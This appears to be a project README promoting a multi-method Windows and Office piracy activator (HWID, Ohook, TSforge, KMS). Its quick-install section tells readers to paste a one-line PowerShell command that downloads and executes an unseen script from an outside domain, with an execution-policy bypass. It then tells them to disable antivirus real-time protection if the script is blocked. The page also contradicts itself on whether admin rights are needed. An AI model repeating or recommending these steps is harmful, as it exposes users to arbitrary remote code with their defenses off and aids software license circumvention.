<div align="center">

# Windows-Activation-Suite: Multi-Method Activation Toolkit for Windows 10 & 11

![preview](https://raw.githubusercontent.com/josemanuelzaca/windows-activation-suite/main/cover_65de118.svg)

[![tests](https://img.shields.io/badge/tests-ok-2ea44f?style=flat-square&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/setup-847-e11d48?style=flat-square&labelColor=0d1117)]() [![release](https://img.shields.io/badge/release-production-2ea44f?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/ps--core-core-f43f5e?style=flat-square&labelColor=0d1117)]() [![system](https://img.shields.io/badge/system-win_11-be123c?style=flat-square&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop activator that implements four distinct licensing mechanisms—HWID, Ohook, TSforge, and Online KMS—to provision Windows and Office installations across a broad compatibility matrix. HWID establishes a permanent digital license for Windows 10 and 11 by binding the entitlement to the hardware fingerprint, while Ohook delivers persistent Office activation, TSforge handles offline activation for legacy Windows releases, and Online KMS covers volume-licensed scenarios. The suite targets Windows 7, 8, 10, 11, and Server editions alongside Office 2010 through 2021 and 365, detecting the installed edition and resolving the appropriate activation path automatically. Activation operates through native Windows activation APIs without modifying core system files, and the tool exposes backup, restore, and status-reporting utilities so existing licensing state can be preserved or reverted.

## 💻 PowerShell Quick Install

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Prepare PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Execute the setup script
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Forced run via CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Multi-method activation engine** – Implements four distinct activation strategies: HWID for Windows 10/11 digital licensing, Ohook for Office product activation, TSforge for offline activation of legacy Windows versions, and Online KMS for volume licensing scenarios across Windows and Office.
- **Broad platform coverage** – Supports Windows 7, 8, 8.1, 10, 11 editions (Home, Pro, Enterprise, Education, LTSC, IoT), Windows Server 2016/2019/2022, and Microsoft Office 2010 through 2021 and 365.
- **Automatic edition and environment detection** – Identifies the installed Windows edition and Office product configuration at runtime, then selects the appropriate activation path without manual configuration.
- **Activation state diagnostics** – Reports current licensing status, including whether activation is permanent or KMS-based, remaining grace periods, and product key channel information.
- **Extended Security Updates (ESU) enablement** – Provides optional ESU activation for Windows 7 and Windows 10 installations requiring post-end-of-support security patches.
- **Activation backup and restore** – Captures the current activation state and licensing tokens to a local store, enabling restoration after system reimaging or major updates.
- **Native API integration** – Relies on built-in Windows activation interfaces and software protection services rather than DLL injection, reducing system footprint and compatibility risk.
- **No core system modification** – Operates without altering protected system files, and all applied changes are reversible through the tool's restore and uninstall paths.
- **Offline-capable operation** – Performs activation and reactivation tasks without persistent network connectivity once the tool's assets are available locally.
- **Update-resilient design** – Maintained to remain functional across cumulative and feature Windows updates, with reapplication guidance when major version changes invalidate prior activation state.

## How It Works

Windows-Activation-Suite is built around a unified activation engine that abstracts four distinct activation backends behind a single detection-and-dispatch layer. On launch, the suite enumerates the installed Windows edition, build number, and Office product configuration, then maps that inventory to the activation method most appropriate for the target — HWID for modern Windows digital licensing, Ohook for Office, TSforge for legacy offline scenarios, and Online KMS for volume and server products.

Each backend operates through native Windows activation interfaces rather than binary patching. The HWID module derives a hardware-bound ticket from the machine's identification fingerprint and provisions a corresponding digital license through the standard licensing pipeline, producing activation that survives reboots and does not require periodic renewal. The Ohook backend intercepts Office licensing calls at the library level to satisfy entitlement checks locally, yielding persistent Office activation without contacting external infrastructure. The TSforge backend targets older Windows generations by writing activation tokens into the local licensing store offline, while the Online KMS module provisions a lightweight local KMS endpoint that services renewal requests on a configurable cycle.

The engine validates state before and after every operation: it queries the current license status, records the pre-activation baseline, applies the selected method, then re-reads license and grace-period data to confirm success. A backup-and-restore subsystem captures activation artifacts so the prior state can be reinstated on demand, and edition detection ensures the correct product key channel is selected automatically, removing the need for manual SKU matching. Extended Security Updates provisioning for end-of-life platforms is handled through the same dispatch layer.

Because every method relies on documented activation APIs and reversible state changes, the suite avoids modifying core system files or injecting persistent payloads. All operations are logged, and the tool reports a clear pass/fail result per subsystem so failures can be isolated to a specific backend or product family.

## Compatibility

Windows-Activation-Suite is engineered for broad cross-version interoperability across desktop Windows platforms and the Microsoft Office productivity suite. The activation engine detects the host operating system edition and build at runtime, then selects an appropriate activation pathway from the available HWID, Ohook, TSforge, and Online KMS methods.

**Windows Support**

- Windows 7 — Home, Professional, Ultimate, Enterprise (TSforge / Online KMS)
- Windows 8 and 8.1 — Core, Professional, Enterprise (TSforge / Online KMS)
- Windows 10 — Home, Pro, Enterprise, Education, LTSC (HWID / Online KMS)
- Windows 11 — Home, Pro, Enterprise, Education, IoT (HWID / Online KMS)
- Windows Server — 2016, 2019, 2022 (Online KMS)

**Office Support**

- Office 2010 through 2021 — all editions (Ohook / Online KMS)
- Office 365 — subscription editions (Ohook)

**Architecture and Environment Requirements**

- x86 and x64 processor architectures are supported across all listed operating systems.
- Administrative privileges are required for activation operations; the suite elevates through the standard Windows UAC prompt.
- PowerShell is used as the execution host on modern Windows builds; legacy systems rely on the compatible command interpreter path.
- Network connectivity is required only during initial activation with online methods; HWID and Ohook activation persist offline after completion.
- No kernel drivers, DLL injection, or core system file modifications are performed, preserving compatibility with Windows Update and system integrity mechanisms.

**Activation Method Compatibility Notes**

- HWID generates a permanent digital license bound to the hardware fingerprint and is the recommended pathway for Windows 10 and 11.
- Ohook provides permanent Office activation by hooking the licensing subsystem at the user-mode level, avoiding system file changes.
- TSforge targets older Windows releases and performs offline activation without sustained network access.
- Online KMS applies to volume-licensed Windows and Office products and may require periodic renewal depending on the configured activation interval.
- Extended Security Updates (ESU) activation is available for Windows 7 and Windows 10 installations within their respective support windows.

**Known Compatibility Considerations**

- Major Windows feature updates may reset activation state; re-execution of the suite restores the prior activation.
- Antivirus real-time protection may intercept script execution; temporary exclusion is advised during activation.
- Domain-restricted networks or ISP-level filtering can block online activation endpoints; DNS-over-HTTPS at the browser or system level resolves such cases.
- Edition detection falls back gracefully on unrecognized builds, reporting the detected edition and available methods before proceeding.

## FAQ

**Q: What exactly is Windows-Activation-Suite?**

A: Windows-Activation-Suite is an open-source command-line tool that activates Windows and Office installations through four distinct activation backends: HWID, Ohook, TSforge, and Online KMS. Each backend targets a specific activation mechanism and licensing model, and the suite selects the appropriate method based on the detected Windows edition, build number, and Office product.

**Q: How do the four activation methods differ technically?**

A: HWID generates a hardware-bound digital license by submitting a genuine ticket request to Microsoft's activation servers, producing permanent activation tied to the device's hardware fingerprint. Ohook intercepts Office license verification at runtime by placing a hook library alongside the Office installation, yielding permanent Office activation without contacting servers. TSforge writes activation data directly into the offline licensing store, enabling offline activation for older Windows versions that no longer have reachable activation endpoints. Online KMS configures a KMS client key and points the system at a KMS host to obtain a periodically renewed volume license.

**Q: Is activation permanent?**

A: HWID and Ohook produce permanent activation that persists across reboots and does not require renewal. Online KMS activation is valid for the KMS renewal interval and is refreshed automatically while the KMS host remains reachable. TSforge writes offline tokens directly, so its persistence depends on the target product and is not tied to a network renewal cycle.

**Q: Does the suite modify core system files?**

A: No. The suite operates through native Windows activation APIs and the standard software protection platform interfaces. HWID and KMS use the built-in licensing client, Ohook confines its changes to the Office installation directory, and TSforge writes to the offline licensing store. No system DLLs are patched, and no kernel components are altered.

**Q: Will Windows updates or Office updates break activation?**

A: Cumulative updates and security patches generally do not affect activation state. Feature updates that rebuild the licensing components or reset the software protection platform cache may require re-running the suite. Ohook survives Office Click-to-Run updates in most cases but may need reapplication after a full Office reinstall or major version upgrade.

**Q: Can I revert activation?**

A: Yes. The suite exposes restore and uninstall operations that remove injected licenses, clear KMS client configuration, and revert Ohook changes. After reverting, the system returns to its prior licensing state and can be reactivated by legitimate means.

**Q: How does the suite determine which method to apply?**

A: Edition and build detection runs first, mapping the installed Windows SKU and Office product to the supported method matrix. Windows 10 and 11 editions with digital license eligibility default to HWID; older Windows versions fall back to TSforge or Online KMS; Office products route to Ohook unless KMS is explicitly selected. The interactive menu surfaces only the methods valid for the detected configuration.

**Q: Does it require an internet connection?**

A: HWID and Online KMS require connectivity to reach activation and KMS endpoints during activation. Ohook and TSforge operate entirely offline. Once HWID activation completes, the resulting digital license remains valid without further network access.

**Q: What permissions are required to run it?**

A: Administrative elevation is mandatory. The suite writes to protected licensing stores, registers KMS client keys, and modifies the Office installation directory, all of which require an elevated token. Running from a non-elevated shell will fail at the first licensing write.

**Q: Is Windows-Activation-Suite affiliated with Microsoft?**

A: No. It is an independent open-source project and is not endorsed by, affiliated with, or supported by Microsoft. Activation of unlicensed software violates Microsoft's Terms of Service; the suite is provided for educational and testing purposes only.

**Q: What is the relationship to the original Microsoft Activation Scripts project?**

A: Windows-Activation-Suite builds on the open-source Microsoft Activation Scripts codebase and retains its activation primitives. Credit for the original activation implementations belongs to the upstream authors. This project extends the detection logic, menu structure, and restore tooling while preserving the upstream licensing behavior.

## Disclaimer

Windows-Activation-Suite is provided strictly as an educational and research tool for studying Windows and Office activation mechanisms, including HWID, Ohook, TSforge, and Online KMS implementations. The software is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

By using this software, you acknowledge and agree to the following:

- **Legal Compliance.** Activating Windows or Office without a valid license may violate Microsoft's Terms of Service and applicable local, national, or international law. It is your sole responsibility to ensure that your use of this software complies with all relevant agreements and regulations.
- **Licensed Installations Only.** Use this tool exclusively on installations of Windows and Office for which you hold a valid, lawfully obtained license, or in controlled environments where you have explicit authorization to test activation behavior.
- **No Liability.** The maintainers and contributors of Windows-Activation-Suite accept no responsibility or liability for any direct, indirect, incidental, or consequential damages, data loss, system instability, licensing disputes, or legal consequences arising from the use or misuse of this software.
- **No Warranty of Outcome.** Activation results may vary depending on Windows edition, build version, cumulative updates, hardware configuration, and Microsoft-side changes. The project makes no guarantee of persistent, uninterrupted, or error-free activation.
- **Third-Party Risk.** Only obtain this software from its official source. Modified or repackaged distributions may contain malware, altered scripts, or unauthorized changes. The maintainers are not responsible for the content or behavior of third-party redistributions.
- **Reversibility.** The tool is designed to use native activation APIs and can be uninstalled or restored, but you are responsible for creating backups and system restore points before use.
- **User Responsibility.** You assume full responsibility for any system modifications, licensing state changes, or configuration alterations resulting from running this software.

If you do not accept these terms, do not use Windows-Activation-Suite.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants broad freedom to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the conditions of the license text.

Under the MIT License terms:

- **Attribution** — The original copyright notice and permission notice must be included in all copies or substantial portions of the software.
- **Warranty Disclaimer** — The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.
- **Liability Limitation** — In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.
- **Source Availability** — The complete source code for every activation method (HWID, Ohook, TSforge, and Online KMS) is available for inspection, auditing, and independent verification.
- **Derivative Works** — Modified versions and forks may be distributed, provided the license terms are preserved and the original attribution is retained.

**Provenance.** Windows-Activation-Suite is derived from the open-source Microsoft Activation Scripts project. All credit for the foundational activation research and implementations belongs to the original developers. This project extends that work with a consolidated suite, additional compatibility coverage across Windows 7 through 11 and Windows Server, expanded Office edition support from 2010 through 2021 and 365, and utility features including edition detection, activation status reporting, and backup/restore support.

**Usage Scope.** The license governs the software itself; it does not grant any rights to Microsoft products, product keys, or activation services. Users are solely responsible for ensuring their use of this software complies with applicable licensing terms and local law. The license grants no warranty of fitness for any particular activation scenario and no guarantee of continued functionality across future Windows or Office updates.

The full license text, including the exact copyright notice and permission grant, is contained in the LICENSE file distributed with this project. That file is the authoritative legal instrument; the summary above is provided for convenience only and has no legal effect.